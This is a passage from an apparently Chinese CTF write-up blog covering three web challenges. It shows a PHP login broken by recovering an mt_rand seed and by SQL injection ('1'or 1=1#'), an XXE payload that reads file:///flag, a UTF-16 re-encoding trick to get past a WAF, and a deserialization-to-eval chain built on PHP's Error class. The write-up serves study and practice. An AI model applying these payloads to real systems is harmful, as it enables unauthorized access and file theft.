class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-type:text/html; charset=utf-8&#x27;</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;login&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$username</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br>    <span class="hljs-variable">$password</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br>    <span class="hljs-variable">$Private_key</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;Private_key&#x27;</span>];<br>    <span class="hljs-keyword">if</span> ((<span class="hljs-variable">$username</span> == <span class="hljs-string">&#x27;&#x27;</span>) || (<span class="hljs-variable">$password</span> == <span class="hljs-string">&#x27;&#x27;</span>) ||(<span class="hljs-variable">$Private_key</span> == <span class="hljs-string">&#x27;&#x27;</span>)) &#123;<br>        <span class="hljs-comment">// 若为空,视为未填写,提示错误,并3秒后返回登录界面</span><br>        <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;refresh:2; url=login.html&#x27;</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;用户名、密码、密钥不能为空啦,crispr会让你在2秒后跳转到登录界面的!&quot;</span>;<br>        <span class="hljs-keyword">exit</span>;<br>&#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-variable">$Private_key</span> != <span class="hljs-string">&#x27;*************&#x27;</span> )<br>    &#123;<br>        <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;refresh:2; url=login.html&#x27;</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;假密钥，咋会让你登录?crispr会让你在2秒后跳转到登录界面的!&quot;</span>;<br>        <span class="hljs-keyword">exit</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$Private_key</span> === <span class="hljs-string">&#x27;************&#x27;</span>)&#123;<br>        <span class="hljs-variable">$getuser</span> = <span class="hljs-string">&quot;SELECT flag FROM user WHERE username= &#x27;crispr&#x27; AND password = &#x27;<span class="hljs-subst">$password</span>&#x27;&quot;</span>.<span class="hljs-string">&#x27;;&#x27;</span>; <br>        <span class="hljs-variable">$link</span>=<span class="hljs-title function_ invoke__">mysql_connect</span>(<span class="hljs-string">&quot;localhost&quot;</span>,<span class="hljs-string">&quot;root&quot;</span>,<span class="hljs-string">&quot;root&quot;</span>);<br>        <span class="hljs-title function_ invoke__">mysql_select_db</span>(<span class="hljs-string">&quot;test&quot;</span>,<span class="hljs-variable">$link</span>);<br>        <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$getuser</span>);<br>        <span class="hljs-keyword">while</span>(<span class="hljs-variable">$row</span>=<span class="hljs-title function_ invoke__">mysql_fetch_assoc</span>(<span class="hljs-variable">$result</span>))&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;tr&gt;&lt;td&gt;&quot;</span>.<span class="hljs-variable">$row</span>[<span class="hljs-string">&quot;username&quot;</span>].<span class="hljs-string">&quot;&lt;/td&gt;&lt;td&gt;&quot;</span>.<span class="hljs-variable">$row</span>[<span class="hljs-string">&quot;flag&quot;</span>].<span class="hljs-string">&quot;&lt;/td&gt;&lt;td&gt;&quot;</span>;<br>        &#125;<br>    &#125;<br>    &#125;<br><br>&#125; <br><span class="hljs-comment">// genarate public_key </span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">public_key</span>(<span class="hljs-params"><span class="hljs-variable">$length</span> = <span class="hljs-number">16</span></span>) </span>&#123;<br>    <span class="hljs-variable">$strings1</span> = <span class="hljs-string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;<br>    <span class="hljs-variable">$public_key</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-keyword">for</span> ( <span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$length</span>; <span class="hljs-variable">$i</span>++ )<br>    <span class="hljs-variable">$public_key</span> .= <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$strings1</span>, <span class="hljs-title function_ invoke__">mt_rand</span>(<span class="hljs-number">0</span>, <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$strings1</span>) - <span class="hljs-number">1</span>), <span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$public_key</span>;<br>  &#125;<br><br>  <span class="hljs-comment">//genarate private_key</span><br>  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">private_key</span>(<span class="hljs-params"><span class="hljs-variable">$length</span> = <span class="hljs-number">12</span></span>) </span>&#123;<br>    <span class="hljs-variable">$strings2</span> = <span class="hljs-string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;<br>    <span class="hljs-variable">$private_key</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-keyword">for</span> ( <span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$length</span>; <span class="hljs-variable">$i</span>++ )<br>    <span class="hljs-variable">$private_key</span> .= <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$strings2</span>, <span class="hljs-title function_ invoke__">mt_rand</span>(<span class="hljs-number">0</span>, <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$strings2</span>) - <span class="hljs-number">1</span>), <span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$private_key</span>;<br>  &#125;<br>  <span class="hljs-variable">$Public_key</span> = <span class="hljs-title function_ invoke__">public_key</span>();<br>  <span class="hljs-comment">//$Public_key = KVQP0LdJKRaV3n9D  how to get crispr&#x27;s private_key???</span><br></code></pre></td></tr></table></figure><p>代码很好理解：先<code>POST</code>一个<code>login</code>参数(<code>isset</code>判断的所以随便写)。再<code>POST</code>用户名密码和私钥，注意这里暂时不会验证用户名和密码，只要私钥对上就能继续下一步：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><br>$getuser <span class="hljs-operator">=</span> &quot;SELECT flag FROM user WHERE username= &#x27;crispr&#x27; AND password = &#x27;$password&#x27;&quot;.<span class="hljs-string">&#x27;;&#x27;</span>; <br><br></code></pre></td></tr></table></figure><p>注意这里，<code>username</code>随便写，但密码一定要对上是<code>crispr</code>的密码。想了想它貌似没对<code>password</code>进行过滤，直接<code>1&#39;or 1=1#</code>就行。</p><p>至于<code>mt_rand</code>这东西，<code>[GWCTF 2019]枯燥的抽奖</code>做过一遍。大致意思就是这个随机数其实是伪随机数，是由种子生成的。找到对应的种子生成的随机数顺序可以保证百分百一致(不过PHP版本要一样？)</p><p><code>php_mt_seed</code>需要的参数:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-variable">$str_long1</span> = <span class="hljs-string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;</span>;<br><span class="hljs-variable">$string</span>=<span class="hljs-string">&#x27;KVQP0LdJKRaV3n9D&#x27;</span>;<br><span class="hljs-variable">$len1</span>=<span class="hljs-number">16</span>;<br><span class="hljs-keyword">for</span> ( <span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$len1</span>; <span class="hljs-variable">$i</span>++ )&#123;<br> <span class="hljs-variable">$pos</span>=<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$str_long1</span>,<span class="hljs-variable">$string</span>[<span class="hljs-variable">$i</span>]); <span class="hljs-comment">//strpos会返回字符串第一次出现的位置，从0开始</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$pos</span>.<span class="hljs-string">&quot; &quot;</span>.<span class="hljs-variable">$pos</span>.<span class="hljs-string">&quot; 0 61 &quot;</span> ;  <span class="hljs-comment">//长度62，从0到61</span><br>&#125;<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//36 36 0 61 47 47 0 61 42 42 0 61 41 41 0 61 52 52 0 61 37 37 0 61 3 3 0 61 35 35 0 61 36 36 0 61 43 43 0 61 0 0 0 61 47 47 0 61 55 55 0 61 13 13 0 61 61 61 0 61 29 29 0 61 </span><br></code></pre></td></tr></table></figure><p>真服了不知道我这个<code>mt_seed</code>抽什么风跑好久跑不出来结果,吗的:</p><p><img src="/img/ezaduit3.png" alt="ezaduit3"></p><p>跑了半天终于出来了：</p><p><img src="/img/ezaudit3.png" alt="ezaudit3"></p><p>生成私钥：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">mt_srand</span>(<span class="hljs-number">1775196155</span>);    <span class="hljs-comment">//在这里填入获得的种子</span><br><span class="hljs-variable">$str_long1</span> = <span class="hljs-string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;<br><br><span class="hljs-variable">$str2</span>=<span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-variable">$len2</span>=<span class="hljs-number">16</span>;<br><span class="hljs-keyword">for</span> ( <span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$len2</span>; <span class="hljs-variable">$i</span>++ )&#123;<br>    <span class="hljs-variable">$str2</span>.=<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$str_long1</span>, <span class="hljs-title function_ invoke__">mt_rand</span>(<span class="hljs-number">0</span>, <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$str_long1</span>) - <span class="hljs-number">1</span>), <span class="hljs-number">1</span>);       <br>&#125;<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$str2</span>);<br><br><span class="hljs-variable">$str</span>=<span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-variable">$len1</span>=<span class="hljs-number">12</span>;<br><span class="hljs-keyword">for</span> ( <span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$len1</span>; <span class="hljs-variable">$i</span>++ )&#123;<br>    <span class="hljs-variable">$str</span>.=<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$str_long1</span>, <span class="hljs-title function_ invoke__">mt_rand</span>(<span class="hljs-number">0</span>, <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$str_long1</span>) - <span class="hljs-number">1</span>), <span class="hljs-number">1</span>);       <br>&#125;<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$str</span>);<br><br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//XuNhoueCDCGc</span><br></code></pre></td></tr></table></figure><p>注意一定要先生成公钥再生成私钥，用题目里的代码也行：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">mt_srand</span>(<span class="hljs-number">1775196155</span>);<br><span class="hljs-comment">//公钥</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">public_key</span>(<span class="hljs-params"><span class="hljs-variable">$length</span> = <span class="hljs-number">16</span></span>) </span>&#123;<br>    <span class="hljs-variable">$strings1</span> = <span class="hljs-string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;<br>    <span class="hljs-variable">$public_key</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-keyword">for</span> ( <span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$length</span>; <span class="hljs-variable">$i</span>++ )<br>    <span class="hljs-variable">$public_key</span> .= <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$strings1</span>, <span class="hljs-title function_ invoke__">mt_rand</span>(<span class="hljs-number">0</span>, <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$strings1</span>) - <span class="hljs-number">1</span>), <span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$public_key</span>;<br>&#125;<br><span class="hljs-comment">//私钥</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">private_key</span>(<span class="hljs-params"><span class="hljs-variable">$length</span> = <span class="hljs-number">12</span></span>) </span>&#123;<br><br><span class="hljs-variable">$strings2</span> = <span class="hljs-string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;<br><span class="hljs-variable">$private_key</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-keyword">for</span> ( <span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$length</span>; <span class="hljs-variable">$i</span>++ )<br><span class="hljs-variable">$private_key</span> .= <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$strings2</span>, <span class="hljs-title function_ invoke__">mt_rand</span>(<span class="hljs-number">0</span>, <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$strings2</span>) - <span class="hljs-number">1</span>), <span class="hljs-number">1</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-variable">$private_key</span>;<br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">public_key</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">private_key</span>();<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><p>然后直接登录就行</p><h2 id="CSAWQual-2019-Web-Unagi"><a href="#CSAWQual-2019-Web-Unagi" class="headerlink" title="[CSAWQual 2019]Web_Unagi"></a>[CSAWQual 2019]Web_Unagi</h2><p><code>about.php</code></p><p><img src="/img/webunagi1.png" alt="webunagi1"></p><p><code>upload.php</code>存在文件上传功能，然后给了个上传文件形式的例子：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">users</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span>alice<span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>passwd1<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>Alice<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">email</span>&gt;</span>alice@fakesite.com<span class="hljs-tag">&lt;/<span class="hljs-name">email</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">group</span>&gt;</span>CSAW2019<span class="hljs-tag">&lt;/<span class="hljs-name">group</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span>bob<span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>passwd2<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span> Bob<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">email</span>&gt;</span>bob@fakesite.com<span class="hljs-tag">&lt;/<span class="hljs-name">email</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">group</span>&gt;</span>CSAW2019<span class="hljs-tag">&lt;/<span class="hljs-name">group</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">users</span>&gt;</span><br></code></pre></td></tr></table></figure><p><code>XXE:</code></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&#x27;1.0&#x27;?&gt;</span> <br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">users</span> [ <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">xxe</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///flag&quot;</span> &gt;</span>]&gt;</span> <br><span class="hljs-tag">&lt;<span class="hljs-name">users</span>&gt;</span> <br>    <span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span> <br>        <span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span>bob<span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span> <br>        <span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>passwd2<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span> <br>        <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span> Bob<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span> <br>        <span class="hljs-tag">&lt;<span class="hljs-name">email</span>&gt;</span>bob@fakesite.com<span class="hljs-tag">&lt;/<span class="hljs-name">email</span>&gt;</span> <br>        <span class="hljs-tag">&lt;<span class="hljs-name">group</span>&gt;</span>xxe<span class="hljs-tag">&lt;/<span class="hljs-name">group</span>&gt;</span> <br>        <span class="hljs-tag">&lt;<span class="hljs-name">intro</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">intro</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span> <br><span class="hljs-tag">&lt;/<span class="hljs-name">users</span>&gt;</span><br></code></pre></td></tr></table></figure><p>我一开始放到<code>&lt;group&gt;</code>里了，结果导致显示不完全。。</p><p>上传后提示：</p><p><img src="/img/webagi2.png" alt="webagi2"></p><p>触发了<code>WAF</code>，这里可以使用编码绕过：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span>参考：<br>https:<span class="hljs-regexp">//</span>johnfrod.top<span class="hljs-regexp">/ctf/</span>csawqual-<span class="hljs-number">2019</span>unagi/<br>https:<span class="hljs-regexp">//</span>xz.aliyun.com<span class="hljs-regexp">/t/</span><span class="hljs-number">4059</span><span class="hljs-comment">#toc-4</span><br>https:<span class="hljs-regexp">//</span>blog.csdn.net<span class="hljs-regexp">/qq_54929891/</span>article<span class="hljs-regexp">/details/</span><span class="hljs-number">124481254</span><br></code></pre></td></tr></table></figure><blockquote><p>一个xml文档不仅可以用UTF-8编码，也可以用UTF-16(两个变体 - BE和LE)、UTF-32(四个变体 - BE、LE、2143、3412)和EBCDIC编码。</p><p>在这种编码的帮助下，使用正则表达式可以很容易地绕过WAF，因为在这种类型的WAF中，正则表达式通常仅配置为单字符集</p></blockquote><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs lasso">iconv <span class="hljs-params">-f</span> utf8 <span class="hljs-params">-t</span> utf16 <span class="hljs-number">333.</span><span class="hljs-built_in">xml</span>&gt;<span class="hljs-number">1231.</span><span class="hljs-built_in">xml</span><br><span class="hljs-params">-f</span> 指定待转换文件的编码<br><span class="hljs-params">-t</span> 制定目标编码<br>&gt; 将<span class="hljs-number">1.</span><span class="hljs-built_in">xml</span>文档转码后的结果保存到<span class="hljs-number">1231.</span><span class="hljs-built_in">xml</span>文件中<br></code></pre></td></tr></table></figure><p>然后直接上传就行。</p><h2 id="极客大挑战-2020-Greatphp"><a href="#极客大挑战-2020-Greatphp" class="headerlink" title="[极客大挑战 2020]Greatphp"></a>[极客大挑战 2020]Greatphp</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SYCLOVER</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$syc</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$lover</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>( (<span class="hljs-variable language_">$this</span>-&gt;syc != <span class="hljs-variable language_">$this</span>-&gt;lover) &amp;&amp; (<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;syc) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;lover)) &amp;&amp; (<span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$this</span>-&gt;syc)=== <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$this</span>-&gt;lover)) )&#123;<br>           <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\&lt;\?php|\(|\)|\&quot;|\&#x27;/&quot;</span>, <span class="hljs-variable">$this</span>-&gt;syc, <span class="hljs-variable">$match</span>))&#123;<br>               <span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;syc);<br>           &#125; <span class="hljs-keyword">else</span> &#123;<br>               <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Try Hard !!&quot;</span>);<br>           &#125;<br>           <br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;great&#x27;</span>]))&#123;<br>    <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;great&#x27;</span>]);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><code>md5</code>和<code>sha1</code>强相等用数组绕过就行。。但后面直接执行了<code>$syc</code>?还是在类里。这种情况好像不能用数组绕过了</p><p>参考<code>https://johnfrod.top/ctf/2020-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98greatphp/</code></p><p><code>md5()</code>和<code>sha1()</code>可以对一个类进行hash，并且会触发这个类的 <code>__toString</code> 方法；且当<code>eval()</code>函数传入一个类对象时，也会触发这个类里的 <code>__toString</code> 方法。</p><p>所以我们可以使用含有 <code>__toString</code> 方法的PHP内置类来绕过，用的两个比较多的内置类就是 <code>Exception</code> 和 <code>Error</code> ，他们之中有一个 <code>__toString</code> 方法，当类被当做字符串处理时，就会调用这个函数。</p><p>比如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>(<span class="hljs-string">&quot;payload&quot;</span>,<span class="hljs-number">1</span>);<span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>(<span class="hljs-string">&quot;payload&quot;</span>,<span class="hljs-number">2</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\r\n\r\n&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span>;<br><span class="hljs-comment">//结果</span><br><span class="hljs-built_in">Error</span>: payload in /box/script.php:<span class="hljs-number">2</span><br>Stack trace:<br><span class="hljs-comment">#0 &#123;main&#125;</span><br><br><span class="hljs-built_in">Error</span>: payload in /box/script.php:<span class="hljs-number">2</span><br>Stack trace:<br><span class="hljs-comment">#0 &#123;main&#125;</span><br></code></pre></td></tr></table></figure><p>这里可以看到我们能控制的<code>payload</code>被输出了，然后想办法和<code>eval</code>配合就可以执行某些恶意代码。当然，整个输出里有些我们不需要的东西：比如前面的<code>Error</code>和后面的<code>in /box/script.php:2</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//参考了boogipop师傅的文章</span><br><span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;abc:echo 123;&quot;</span>);  <span class="hljs-comment">//123</span><br><span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;abc12:echo 123;&quot;</span>); <span class="hljs-comment">//123</span><br><span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;12a:echo 123;&quot;</span>); <span class="hljs-comment">//报错不能以数字开头</span><br><span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;_12a:echo 123;&quot;</span>);<span class="hljs-comment">//123</span><br><br></code></pre></td></tr></table></figure><p>所以如果前面有冒号的话，只要<strong>冒号前的字符串是规范的变量名</strong>那么就不会报错。那么对于<code>Error: payload in /box/script.php:2</code>这东西，<code>Error: </code>没起啥作用。至于<code>payload</code>后面没有用的部分直接用<code>?&gt;</code>闭合就行。</p><p>比如对于这段代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 